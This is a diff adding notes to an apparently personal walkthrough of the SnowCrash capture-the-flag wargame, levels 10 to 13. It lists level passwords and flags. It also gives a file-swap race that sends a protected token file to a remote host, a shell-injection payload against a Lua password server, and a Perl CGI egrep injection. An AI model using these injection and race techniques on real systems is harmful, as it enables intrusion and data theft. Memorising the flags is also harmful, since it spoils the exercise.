@@ -148,8 +148,64 @@ level09 -> 25749xKZ8L7DkSCwJkT9dyv6f
 	flag09 -> f3iji1ju5yuevaus41q1afiuq
 
 level10 -> s5cAJpM8ev6XHw998pRWG728z
+	run level10
+	>
+	./level10 file host
+		sends file to host if you have access to it
+	<
+	try level10 token 192.168.1.13
+	> You don't have access to token
+	echo bonjour > /tmp/bonjour
+	./level10 /tmp/bonjour 192.168.1.13
+	> Connecting to 192.168.1.13:6969 .. Unable to connect to host 192.168.1.13
+	run ruby server on host and retry
+	>
+	Connecting to 192.168.1.13:6969 .. Connected!
+	Sending file .. wrote file!
+	<
+	retry with ltrace
+	>
+	access("/tmp/bonjour", 4)
+	open("/tmp/bonjour", 0, 010)
+	<
+	security hole -> try to replace file between access and open
+	scp -P 4242 sender.sh level10@192.168.1.16:/tmp
+	scp -P 4242 replacer.sh level10@192.168.1.16:/tmp
+	/tmp/sender.sh
+	ctrl-Z
+	bg
+	jobs
+	./server.rb (on host)
+	/tmp/replacer.sh
+	ctrl-C and kill -9 for job
 
-	in gdb
-	break system
-	x/1s 0x080485e0
-mkisofs -o SnowCrash_mod.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V "Custom SnowCrash Iso" ../SnowCrash
+	flag10 -> woupa2yuojeeaaed06riuj63c
+
+level11 -> feulo4b72j7edeahuete3no7c
+	read code -> lua server waiting for password
+	> prog = io.popen("echo "..pass.." | sha1sum", "r")
+	run -> already running
+	telnet 127.0.0.1 5151
+	write -> lol; getflag > /tmp/flag; echo lol
+	cat /tmp/flag
+
+	flag11 -> X
+
+level12 -> fa6v5ateaw21peobuub8ipe6s
+	read code -> CGI on 4646
+	$xx =~ tr/a-z/A-Z/; -> letters modified
+	$xx =~ s/\s.*//; -> after space trimmed
+	@output = `egrep "^$xx" /tmp/xd 2>&1`;	
+	create /tmp/_
+	>
+	#!/bin/bash
+
+	getflag > /tmp/flag
+	<
+	chmod 777 on /tmp/_
+	send cgi_request_level12
+
+	flag12 -> X
+
+level13 -> g1qKMiRpXf53AWhDaU7FEkczr
+	
